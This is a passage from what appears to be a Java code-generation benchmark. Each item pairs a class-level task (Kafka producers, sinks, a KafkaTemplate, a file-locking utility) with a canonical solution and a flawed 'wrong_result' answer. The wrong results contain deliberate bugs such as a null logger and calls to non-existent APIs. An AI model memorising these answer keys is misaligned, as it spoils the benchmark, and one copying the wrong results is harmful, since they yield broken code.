producerProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, \"false\");\n    producerProps.put(ProducerConfig.ACKS_CONFIG, \"all\");\n    producerProps.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, \"1\");\n    producerProps.put(ProducerConfig.DELIVERY_TIMEOUT_MS_CONFIG,\n        Integer.toString(Integer.MAX_VALUE));\n    return producerProps;\n  }\n\n  @Override\n  public void close() {\n    if (producer != null) {\n      producer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.header.Header;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.header.internals.RecordHeader;\nimport org.slf4j.Logger;\n\nimport java.nio.ByteBuffer;\nimport java.util.*;\n\npublic class DlqAction implements RuleAction {\n    private static final Logger log = null; // Assume logger is initialized elsewhere\n    public static final String TYPE = \"DLQ\";\n    public static final String DLQ_TOPIC = \"dlq.topic\";\n    public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n    public static final String PRODUCER = \"kafka.producer\";\n    public static final String HEADER_PREFIX = \"rule.\";\n    public static final String RULE_NAME = \"rule.name\";\n    public static final String RULE_MODE = \"rule.mode\";\n    public static final String RULE_SUBJECT = \"rule.subject\";\n    public static final String RULE_TOPIC = \"rule.original.topic\";\n    public static final String RULE_EXCEPTION = \"rule.exception\";\n\n    private Map<String, Object> configs;\n    private String topic;\n    private boolean autoFlush;\n    private KafkaProducer<byte[], byte[]> producer;\n\n    @Override\n    public void configure(Map<String, ?> configs) {\n        this.configs = new HashMap<>();\n        for (Map.Entry<String, ?> entry : configs.entrySet()) {\n            this.configs.put(entry.getKey(), entry.getValue());\n        }\n\n        this.topic = (String) this.configs.get(DLQ_TOPIC);\n        if (this.topic == null || this.topic.isEmpty()) {\n            throw new IllegalArgumentException(\"DLQ topic must be configured\");\n        }\n\n        this.autoFlush = Boolean.parseBoolean((String) this.configs.getOrDefault(DLQ_AUTO_FLUSH, \"false\"));\n        this.producer = (KafkaProducer<byte[], byte[]>) this.configs.get(PRODUCER);\n        if (this.producer == null) {\n            this.producer = new KafkaProducer<>(baseProducerConfigs());\n        }\n    }\n\n    @Override\n    public void run(RuleContext ctx, Object message, RuleException ex) {\n        try {\n            byte[] payload = convertToBytes(ctx, message);\n            ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, payload);\n            populateHeaders(ctx, record, ex);\n            producer.send(record, (metadata, exception) -> {\n                if (exception != null) {\n                    log.error(\"Failed to send DLQ message\", exception);\n                } else {\n                    log.info(\"Sent DLQ message to {}@{}\", metadata.topic(), metadata.partition());\n                }\n            });\n\n            if (autoFlush) {\n                producer.flush();\n            }\n        } catch (Exception e) {\n            log.error(\"Error processing DLQ message\", e);\n        }\n    }\n\n    protected KafkaProducer<byte[], byte[]> producer() {\n        if (producer == null) {\n            producer = new KafkaProducer<>(baseProducerConfigs());\n        }\n        return producer;\n    }\n\n    protected byte[] convertToBytes(RuleContext ctx, Object message) {\n        if (message instanceof byte[]) {\n            return (byte[]) message;\n        } else if (message instanceof ByteBuffer) {\n            return ((ByteBuffer) message).array();\n        } else if (message instanceof String) {\n            return toBytes((String) message);\n        } else {\n            return convertToJsonBytes(ctx, message);\n        }\n    }\n\n    protected byte[] convertToJsonBytes(RuleContext ctx, Object message) {\n        // Implement JSON serialization logic here\n        return toBytes(message.toString()); // Placeholder\n    }\n\n    protected byte[] toBytes(String value) {\n        return value.getBytes(java.nio.charset.StandardCharsets.UTF_8);\n    }\n\n    protected void populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n        Headers headers = producerRecord.headers();\n\n        addHeaderIfNotNull(headers, HEADER_PREFIX + RULE_NAME, ctx.getRuleName());\n        addHeaderIfNotNull(headers, HEADER_PREFIX + RULE_MODE, ctx.getRuleMode().name());\n        addHeaderIfNotNull(headers, HEADER_PREFIX + RULE_SUBJECT, ctx.getSubject());\n        addHeaderIfNotNull(headers, HEADER_PREFIX + RULE_TOPIC, ctx.getTopic());\n        addHeaderIfNotNull(headers, HEADER_PREFIX + RULE_EXCEPTION, ex.getMessage());\n    }\n\n    private void addHeaderIfNotNull(Headers headers, String key, String value) {\n        if (value != null && !value.isEmpty()) {\n            headers.add(new RecordHeader(key, toBytes(value)));\n        }\n    }\n\n    protected Map<String, Object> baseProducerConfigs() {\n        Map<String, Object> props = new HashMap<>();\n        props.put(\"bootstrap.servers\", \"localhost:9092\");\n        props.put(\"key.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        props.put(\"value.serializer\", \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n        return props;\n    }\n\n    @Override\n    public void close() {\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Create a Kafka sink class that writes data to a Kafka topic, with configuration parameters for the Kafka producer and topic name.\n\nClass Description: The KafkaSink class is a self-documenting sink that takes data from an observable stream, encodes it, and writes it to a specified Kafka topic. It handles Kafka producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- encoder: [Func1<T, byte[]>] - Function to encode the input data into byte arrays\n- registry: [Registry] - Metrics registry for monitoring\n- kafkaProducerAtomicRef: [AtomicReference<KafkaProducer<byte[], byte[]>>] - Thread-safe reference to the Kafka producer instance\n- subscription: [Subscription] - Subscription to the observable data stream\n\nMethods:\n- call: [call(Context context, PortRequest ignore, Observable<T> dataO)] -> [void] - Initializes the Kafka producer if needed and subscribes to the input observable to send data to Kafka\n- getParameters: [getParameters()] -> [List<ParameterDefinition<?>>] - Returns the list of parameter definitions for Kafka configuration and topic name\n- metadata: [metadata()] -> [Metadata] - Provides metadata about the sink including name and description\n- close: [close()] -> [void] - Cleans up resources by unsubscribing from the observable stream",
    "Canonical_solution": "import com.netflix.spectator.api.Registry;\nimport io.mantisrx.runtime.Context;\nimport io.mantisrx.runtime.Metadata;\nimport io.mantisrx.runtime.PortRequest;\nimport io.mantisrx.runtime.parameter.ParameterDefinition;\nimport io.mantisrx.runtime.parameter.Parameters;\nimport io.mantisrx.runtime.parameter.type.StringParameter;\nimport io.mantisrx.runtime.parameter.validator.Validators;\nimport io.mantisrx.runtime.sink.SelfDocumentingSink;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> implements SelfDocumentingSink<T> {\n    private static final Logger logger = LoggerFactory.getLogger(KafkaSink.class);\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>(null);\n    private Subscription subscription;\n\n    KafkaSink(Registry registry, Func1<T, byte[]> encoder) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    @Override\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            MantisKafkaProducerConfig mantisKafkaProducerConfig = new MantisKafkaProducerConfig(context);\n            Map<String, Object> producerProperties = mantisKafkaProducerConfig.getProducerProperties();\n            KafkaProducer<byte[], byte[]> kafkaProducer = new KafkaProducer<>(producerProperties);\n            kafkaProducerAtomicRef.compareAndSet(null, kafkaProducer);\n            logger.info(\"Kafka Producer initialized\");\n        }\n        KafkaProducer<byte[], byte[]> kafkaProducer = kafkaProducerAtomicRef.get();\n        Parameters parameters = context.getParameters();\n        String topic = (String)parameters.get(KafkaSinkJobParameters.TOPIC);\n\n        subscription = dataO.map(encoder::call)\n            .flatMap((dataBytes) ->\n                         Observable.from(kafkaProducer.send(new ProducerRecord<>(topic, dataBytes)))\n                             .subscribeOn(Schedulers.io()))\n            .subscribe();\n    }\n\n    @Override\n    public List<ParameterDefinition<?>> getParameters() {\n        final List<ParameterDefinition<?>> params = new ArrayList<>();\n        params.add(new StringParameter()\n                       .name(KafkaSinkJobParameters.TOPIC)\n                       .description(\"Kafka topic to write to\")\n                       .validator(Validators.notNullOrEmpty())\n                       .required()\n                       .build());\n        params.addAll(MantisKafkaProducerConfig.getJobParameterDefinitions());\n        return params;\n    }\n\n    @Override\n    public Metadata metadata() {\n        StringBuilder description = new StringBuilder();\n        description.append(\"Writes the output of the job into the configured Kafka topic\");\n\n        return new Metadata.Builder()\n            .name(\"Mantis Kafka Sink\")\n            .description(description.toString())\n            .build();\n    }\n\n    @Override\n    public void close() {\n        subscription.unsubscribe();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport rx.Observable;\nimport rx.Subscription;\n\nimport java.util.List;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class KafkaSink<T> {\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>();\n    private Subscription subscription;\n\n    public KafkaSink(Func1<T, byte[]> encoder, Registry registry) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            Properties props = new Properties();\n            List<ParameterDefinition<?>> parameters = getParameters();\n            for (ParameterDefinition<?> param : parameters) {\n                Object value = context.getParameter(param.getName());\n                if (value != null) {\n                    props.put(param.getName(), value.toString());\n                }\n            }\n            kafkaProducerAtomicRef.set(new KafkaProducer<>(props));\n        }\n\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n\n        subscription = dataO.subscribe(\n            item -> {\n                byte[] key = null;\n                byte[] value = encoder.call(item);\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(\"default-topic\", key, value);\n                producer.send(record);\n            },\n            throwable -> {\n                System.err.println(\"Error sending data to Kafka: \" + throwable.getMessage());\n            },\n            () -> {\n                producer.close();\n                kafkaProducerAtomicRef.set(null);\n            }\n        );\n    }\n\n    public List<ParameterDefinition<?>> getParameters() {\n        return List.of(\n            new ParameterDefinition<>(\"bootstrap.servers\", String.class, \"Kafka bootstrap servers\"),\n            new ParameterDefinition<>(\"key.serializer\", String.class, \"Key serializer class\"),\n            new ParameterDefinition<>(\"value.serializer\", String.class, \"Value serializer class\"),\n            new ParameterDefinition<>(\"topic.name\", String.class, \"Target Kafka topic name\")\n        );\n    }\n\n    public Metadata metadata() {\n        return new Metadata(\"KafkaSink\", \"A sink that writes data to a Kafka topic.\");\n    }\n\n    public void close() {\n        if (subscription != null) {\n            subscription.unsubscribe();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a Java class that implements a Kafka producer for sending partition metric samples to a Kafka topic, with configurable producer properties and error handling.\n\nClass Description: KafkaSampleProducer is a class that provides functionality to create and manage a Kafka producer for sending partition metric samples. It handles producer configuration, message sending, and proper resource cleanup.\n\nAttributes:\n- PRODUCER_CLOSE_TIMEOUT: [Duration] - The maximum time to wait for the producer to close gracefully\n- _shutdown: [boolean] - Flag indicating whether the producer should be shut down\n- _producer: [Producer<byte[], byte[]>] - The Kafka producer instance\n\nMethods:\n- createProducer: [void]([Map<String, ?> config, String producerClientId]) -> [void] - Configures and creates a Kafka producer instance with the given configuration and client ID\n- storePartitionMetricSamples: [AtomicInteger]([MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log]) -> [AtomicInteger] - Sends partition metric samples to the specified Kafka topic and returns the count of successfully sent samples\n- close: [void]([]) -> [void] - Gracefully shuts down the Kafka producer with a timeout",
    "Canonical_solution": "import com.linkedin.kafka.cruisecontrol.monitor.sampling.holder.PartitionMetricSample;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport static com.linkedin.kafka.cruisecontrol.monitor.sampling.SamplingUtils.bootstrapServers;\n\npublic class KafkaSampleProducer {\n    protected static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofMinutes(3);\n    protected volatile boolean _shutdown = false;\n    protected Producer<byte[], byte[]> _producer;\n\n    protected void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties producerProps = new Properties();\n        producerProps.putAll(config);\n        producerProps.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers(config));\n        producerProps.setProperty(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        producerProps.setProperty(ProducerConfig.LINGER_MS_CONFIG, \"30000\");\n        producerProps.setProperty(ProducerConfig.BATCH_SIZE_CONFIG, \"500000\");\n        producerProps.setProperty(ProducerConfig.BUFFER_MEMORY_CONFIG, \"67108864\");\n        producerProps.setProperty(ProducerConfig.RETRIES_CONFIG, \"5\");\n        producerProps.setProperty(ProducerConfig.COMPRESSION_TYPE_CONFIG, \"gzip\");\n        producerProps.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG, config.get(\"reconnect.backoff.ms\").toString());\n        _producer = new KafkaProducer<>(producerProps);\n    }\n\n    static AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer,\n                                                   String partitionMetricSampleStoreTopic, Logger log) {\n        final AtomicInteger metricSampleCount = new AtomicInteger(0);\n        for (PartitionMetricSample sample : samples.partitionMetricSamples()) {\n            producer.send(new ProducerRecord<>(partitionMetricSampleStoreTopic, null, sample.sampleTime(), null, sample.toBytes()),\n                        (recordMetadata, e) -> {\n                            if (e == null) {\n                                metricSampleCount.incrementAndGet();\n                            } else {\n                                log.error(\"Failed to produce partition metric sample for {} of timestamp {} due to exception\",\n                                          sample.entity().tp(), sample.sampleTime(), e);\n                            }\n                        });\n        }\n        return metricSampleCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        _producer.close(PRODUCER_CLOSE_TIMEOUT);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class KafkaSampleProducer {\n    private static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofSeconds(30);\n    private volatile boolean _shutdown = false;\n    private Producer<byte[], byte[]> _producer;\n\n    public void createProducer(Map<String, ?> config, String producerClientId) {\n        if (_producer != null) {\n            _producer.close();\n        }\n\n        config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        config.put(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n\n        _producer = new KafkaProducer<>(config);\n    }\n\n    public AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples,\n                                                     Producer<byte[], byte[]> producer,\n                                                     String partitionMetricSampleStoreTopic,\n                                                     Logger log) {\n        AtomicInteger sentCount = new AtomicInteger(0);\n\n        for (byte[] sample : samples.getSamples()) {\n            if (_shutdown) {\n                break;\n            }\n\n            try {\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(partitionMetricSampleStoreTopic, sample);\n                producer.send(record, (metadata, exception) -> {\n                    if (exception == null) {\n                        sentCount.incrementAndGet();\n                    } else {\n                        log.error(\"Failed to send sample to Kafka\", exception);\n                    }\n                });\n            } catch (Exception e) {\n                log.error(\"Error sending sample to Kafka topic: {}\", partitionMetricSampleStoreTopic, e);\n            }\n        }\n\n        return sentCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        if (_producer != null) {\n            _producer.close(PRODUCER_CLOSE_TIMEOUT);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Create a KafkaTemplate class that provides a high-level abstraction for sending messages to Kafka topics, handling both transactional and non-transactional producers, and managing producer lifecycle.\n\nClass Description: The KafkaTemplate class is a Spring Kafka helper class that simplifies the process of sending messages to Kafka topics. It wraps a ProducerFactory and provides various methods for sending messages with different parameters. The class handles producer creation, message sending, and resource cleanup automatically.\n\nAttributes:\n- producerFactory: [ProducerFactory<K, V>] - The factory used to create Kafka producers\n- autoFlush: [boolean] - Flag indicating whether to automatically flush the producer after sending\n- transactional: [boolean] - Flag indicating whether the producer factory is transactional\n\nMethods:\n- send(String topic, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data to the specified topic without a key\n- send(String topic, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with a key to the specified topic\n- send(String topic, Integer partition, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with key and partition to the specified topic\n- send(ProducerRecord<K, V> record) -> [CompletableFuture<SendResult<K, V>>] - Sends a complete ProducerRecord\n- doSend(ProducerRecord<K, V> producerRecord) -> [CompletableFuture<SendResult<K, V>>] - Internal method that handles the actual sending logic\n- partitionsFor(String topic) -> [List<PartitionInfo>] - Returns partition information for the given topic\n- metrics() -> [Map<MetricName, ? extends Metric>] - Returns the producer metrics\n- closeProducer(Producer<K, V> producer, boolean inTx) -> [void] - Closes the producer unless in a transaction\n- getTheProducer() -> [Producer<K, V>] - Gets a producer instance (non-topic specific)\n- getTheProducer(String topic) -> [Producer<K, V>] - Gets a producer instance (optionally topic-specific)\n- inTransaction() -> [boolean] - Checks if currently in a transaction",
    "Canonical_solution": "import org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.Metric;\nimport org.apache.kafka.common.MetricName;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.support.SendResult;\nimport org.springframework.util.Assert;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.Future;\n\npublic class KafkaTemplate<K, V> {\n\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this(producerFactory, false);\n    }\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush) {\n        Assert.notNull(producerFactory, \"'producerFactory' cannot be null\");\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = this.producerFactory.transactionCapable();\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        Assert.notNull(record, \"'record' cannot be null\");\n        return doSend(record);\n    }\n\n    protected CompletableFuture<SendResult<K, V>> doSend(final ProducerRecord<K, V> producerRecord) {\n        final Producer<K, V> producer = getTheProducer(producerRecord.topic());\n        final CompletableFuture<SendResult<K, V>> future = new CompletableFuture<>();\n        Future<RecordMetadata> sendFuture = producer.send(producerRecord, (metadata, exception) -> {\n            if (exception == null) {\n                future.complete(new SendResult<>(producerRecord, metadata));\n            }\n            else {\n                future.completeExceptionally(\n                        new KafkaProducerException(producerRecord, \"Failed to send\", exception));\n            }\n            closeProducer(producer, this.transactional);\n        });\n        if (sendFuture.isDone()) {\n            try {\n                sendFuture.get();\n            }\n            catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted\", e);\n            }\n            catch (ExecutionException e) {\n                throw new KafkaException(\"Send failed\", e.getCause());\n            }\n        }\n        if (this.autoFlush) {\n            producer.flush();\n        }\n        return future;\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.partitionsFor(topic);\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.metrics();\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    protected void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    protected Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    protected Producer<K, V> getTheProducer(@Nullable String topic) {\n        if (this.transactional) {\n            Assert.state(inTransaction(),\n                    \"No transaction is in process; possible solutions: run the template operation within the scope of a template.executeInTransaction() operation\");\n            return this.producerFactory.createProducer();\n        }\n        else {\n            return this.producerFactory.createProducer();\n        }\n    }\n\n    public boolean inTransaction() {\n        return this.transactional && TransactionSynchronizationManager.getResource(this.producerFactory) != null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.Metric;\nimport org.apache.kafka.common.MetricName;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.util.concurrent.ListenableFuture;\nimport org.springframework.util.concurrent.SettableListenableFuture;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class KafkaTemplate<K, V> {\n\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n    private final AtomicBoolean inTransaction = new AtomicBoolean(false);\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this(producerFactory, false);\n    }\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush) {\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = producerFactory.isConfiguredToBeTransactional();\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, V data) {\n        return doSend(new ProducerRecord<>(topic, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, V data) {\n        return doSend(new ProducerRecord<>(topic, key, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, V data) {\n        return doSend(new ProducerRecord<>(topic, partition, key, data));\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        return doSend(record);\n    }\n\n    protected CompletableFuture<SendResult<K, V>> doSend(ProducerRecord<K, V> producerRecord) {\n        SettableListenableFuture<SendResult<K, V>> future = new SettableListenableFuture<>();\n        try {\n            Producer<K, V> producer = getTheProducer(producerRecord.topic());\n            ListenableFuture<RecordMetadata> sendFuture = producer.send(producerRecord, (metadata, exception) -> {\n                if (exception != null) {\n                    future.setException(exception);\n                } else {\n                    future.set(new SendResult<>(metadata, producerRecord));\n                }\n            });\n            if (autoFlush) {\n                producer.flush();\n            }\n        } catch (Exception ex) {\n            future.setException(ex);\n        }\n        return future.completable();\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        return getTheProducer(topic).partitionsFor(topic);\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        return getTheProducer().metrics();\n    }\n\n    protected void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx || !transactional) {\n            producer.close();\n        }\n    }\n\n    protected Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    protected Producer<K, V> getTheProducer(String topic) {\n        return producerFactory.createProducer(topic);\n    }\n\n    public boolean inTransaction() {\n        return inTransaction.get();\n    }\n}\n```"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Create a Java class that manages job prefix files with thread-safe file operations, including creation, locking, and cleanup.\n\nClass Description: JobPrefixFile is a thread-safe utility class that manages temporary files with unique prefixes. It provides file locking mechanisms to prevent concurrent access issues and handles proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- prefix: String - The unique prefix used for the file name\n- file: Path - The path to the managed file\n- channel: FileChannel - The file channel for file operations\n- lock: FileLock - The lock object for thread-safe file access\n\nMethods:\n- create(Path directory) -> JobPrefixFile - Static factory method to create a new instance with default prefix in specified directory\n- create(String prefix, Path directory) -> JobPrefixFile - Static factory method to create a new instance with custom prefix in specified directory\n- tryFromExistingFile(Path file) -> JobPrefixFile - Static method to create an instance from an existing file if it can be locked\n- delete() -> void - Deletes the managed file and releases resources\n- prefix() -> String - Returns the file prefix\n- release() -> void - Releases the file lock and closes the channel\n- close() -> void - Calls release() to implement AutoCloseable interface\n- deleteIfExists(Path file) -> void - Helper method to safely delete a file if it exists\n- close(AutoCloseable closeable) -> void - Static helper method to safely close closeable resources",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.ThreadLocalRandom;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass JobPrefixFile implements AutoCloseable {\n\n  private static final Logger log = LoggerFactory.getLogger(JobPrefixFile.class);\n\n  private final String prefix;\n  private final Path file;\n\n  private FileChannel channel;\n  private FileLock lock;\n\n  public static JobPrefixFile create(Path directory) throws IOException {\n    return create(null, directory);\n  }\n\n  public static JobPrefixFile create(final String prefix, final Path directory)\n      throws IOException {\n    return new JobPrefixFile(prefix, directory);\n  }\n\n  public static JobPrefixFile tryFromExistingFile(final Path file) throws IOException {\n    Preconditions.checkNotNull(file);\n    final FileChannel channel = FileChannel.open(file, WRITE);\n    final FileLock lock;\n\n    try {\n      lock = channel.tryLock();\n    } catch (OverlappingFileLockException e) {\n      close(channel);\n      return null;\n    } catch (Exception e) {\n      close(channel);\n      throw e;\n    }\n\n    if (lock == null) {\n      close(channel);\n      return null;\n    }\n\n    return new JobPrefixFile(file, channel, lock);\n  }\n\n  private JobPrefixFile(final String prefix, final Path directory) throws IOException {\n    Preconditions.checkNotNull(directory);\n    this.prefix = prefix == null\n                  ? \"tmp-\" + new SimpleDateFormat(\"yyyyMMdd\").format(new Date()) + \"-\"\n                    + toHexString(ThreadLocalRandom.current().nextInt())\n                  : prefix;\n\n    Files.createDirectories(directory);\n    file = directory.resolve(this.prefix);\n    final Path tmp = directory.resolve(this.prefix + \".tmp\");\n    try {\n      this.channel = FileChannel.open(tmp, CREATE_NEW, WRITE);\n      this.lock = channel.lock();\n      Files.move(tmp, file);\n    } catch (Exception e) {\n      deleteIfExists(tmp);\n      deleteIfExists(file);\n      close(this.channel);\n      throw new RuntimeException(\"Failed to create job prefix file \" + file, e);\n    }\n  }\n\n  private JobPrefixFile(final Path file, final FileChannel channel, final FileLock lock)\n      throws IOException, IllegalStateException {\n    this.file = Preconditions.checkNotNull(file, \"file\");\n    this.channel = Preconditions.checkNotNull(channel, \"channel\");\n    this.lock = Preconditions.checkNotNull(lock, \"lock\");\n    this.prefix = file.getFileName().toString();\n  }\n\n  public void delete() {\n    release();\n    deleteIfExists(file);\n  }\n\n  private void deleteIfExists(Path file) {\n    if (file != null) {\n      try {\n        Files.deleteIfExists(file);\n      } catch (Exception e) {\n        log.warn(\"Failed to delete file {}\", file, e);\n      }\n    }\n  }\n\n  public String prefix() {\n    return prefix;\n  }\n\n  public void release() {\n    close(lock);\n    lock = null;\n    close(channel);\n    channel = null;\n  }\n\n  @Override\n  public void close() {\n    release();\n  }\n\n  private static void close(final AutoCloseable closeable) {\n    if (closeable != null) {\n      try {\n        closeable.close();\n      } catch (Exception e) {\n        log.debug(\"Failed to close {}\", closeable.getClass().getSimpleName(), e);\n      }\n    }\n  }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
